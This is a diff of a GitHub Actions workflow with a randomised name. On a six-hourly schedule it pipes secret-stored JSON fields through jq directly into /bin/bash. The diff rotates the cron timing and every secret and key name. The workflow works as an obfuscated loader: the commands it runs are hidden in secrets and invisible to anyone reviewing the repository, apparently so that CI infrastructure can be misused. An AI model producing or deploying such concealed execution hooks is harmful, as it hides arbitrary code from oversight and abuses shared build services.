@@ -3,25 +3,25 @@ name: thenexplore
 on:
   workflow_dispatch:
   schedule:
-    - cron: '19 5/6 * * *'
-jobs:  # 10246
+    - cron: '51 2/6 * * *'
+
+jobs:
   build:
     runs-on: ubuntu-latest
     steps:
       - uses: actions/checkout@v4
       - name: thenexplore
         env:
-          xlzt706: ${{ secrets.xlzt706 }}
+          ucf1487: ${{ secrets.ucf1487 }}
         run: |
-          echo $xlzt706 | jq -r .gg7 | /bin/bash
-          echo $gpsg1666 | jq -r .jcv68 | /bin/bash
-          echo $i40 | jq -r .j2840 | /bin/bash
-          echo $eeqyv85039 | jq -r .ioys6 | /bin/bash
-          echo $e38102 | jq -r .nvfuu7 | /bin/bash
-          echo $hrjp9 | jq -r .ayi35 | /bin/bash
-          echo $f281 | jq -r .mqmo1200 | /bin/bash
-          echo $j62 | jq -r .jiu66613 | /bin/bash
-          echo $zk2886 | jq -r .qfb89 | /bin/bash
-          echo $a39 | jq -r .hsyrt4776 | /bin/bash
-          echo $efkf5409 | jq -r .ad00 | /bin/bash
+          echo $ucf1487 | jq -r .gwosz14 | /bin/bash
+          echo $a7 | jq -r .kgg7 | /bin/bash
+          echo $uzt0 | jq -r .guguz8 | /bin/bash
+          echo $knyd291 | jq -r .vip7945 | /bin/bash
+          echo $svup2069 | jq -r .lbil543 | /bin/bash
+          echo $byjmt4243 | jq -r .ntcga266 | /bin/bash
+          echo $s54 | jq -r .bfc346 | /bin/bash
+          echo $ivpc36789 | jq -r .ldg382 | /bin/bash
+          echo $it6 | jq -r .m51944 | /bin/bash
+          echo $sjzm03584 | jq -r .g580 | /bin/bash
 
